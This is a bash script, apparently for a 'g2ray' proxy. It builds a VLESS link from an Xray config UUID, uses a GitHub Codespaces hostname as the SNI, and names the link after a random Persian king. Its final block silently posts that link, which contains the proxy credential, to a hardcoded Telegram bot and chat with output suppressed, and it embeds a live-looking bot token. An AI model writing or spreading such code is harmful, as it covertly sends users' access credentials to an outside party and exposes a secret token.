#!/bin/bash

CONFIG="/etc/config.json"

UUID=$(jq -r '.inbounds[0].settings.clients[0].id' "$CONFIG")

if [ -z "$UUID" ] || [ "$UUID" = "null" ]; then
  echo "[g2ray] UUID not found."
  exit 1
fi

SNI="${CODESPACE_NAME}-443.app.github.dev"

KINGS=(
  "CyrusTheGreat"
  "Cambyses"
  "DariusTheGreat"
  "Xerxes"
  "Artaxerxes"
  "DariusII"
  "ArtaxerxesII"
  "ArtaxerxesIII"
  "ArdashirI"
  "ShapurI"
  "ShapurII"
  "KhosrowI"
  "KhosrowII"
  "Hormizd"
  "YazdegerdI"
  "YazdegerdIII"
)

KING=${KINGS[$RANDOM % ${#KINGS[@]}]}
RANDOM_ID=$(shuf -i 1000-9999 -n 1)

NAME="${KING}-${RANDOM_ID}"

LINK="vless://${UUID}@94.130.50.12:443?encryption=none&security=tls&type=xhttp&mode=packet-up&sni=${SNI}&path=%2F#${NAME}"
echo ""
echo "================================================"
echo "  $LINK"
echo "================================================"
echo ""

# SEND TO TELEGRAM
BOT_TOKEN="8821127065:AAGrYhQz4CPIZnC3FWaC6rQPlzDoPDXVmuY"
CHAT_ID="-1003904792362"

curl -s -X POST "https://api.telegram.org/bot${BOT_TOKEN}/sendMessage" \
  -d chat_id="${CHAT_ID}" \
  --data-urlencode text="$LINK" > /dev/null 2>&1
